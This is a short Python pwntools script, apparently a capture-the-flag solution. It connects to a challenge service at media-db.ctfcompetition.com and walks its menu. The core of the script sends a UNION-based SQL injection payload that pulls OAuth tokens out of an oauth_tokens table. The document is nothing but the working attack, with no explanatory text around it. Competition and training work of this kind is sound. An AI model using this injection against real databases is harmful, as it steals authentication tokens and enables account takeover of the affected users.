from pwn import *

conn = remote('media-db.ctfcompetition.com', 1337)

def readlines(conn):
   while True:
        line = conn.recvline(timeout=1)
        if not line:
            break
        print line, 

readlines(conn)

conn.sendline('1')
readlines(conn)
conn.sendline("name' UNION SELECT oauth_token, '1' FROM oauth_tokens WHERE '1'='1")
readlines(conn)
conn.sendline("name")
readlines(conn)
conn.sendline("4")
readlines(conn)
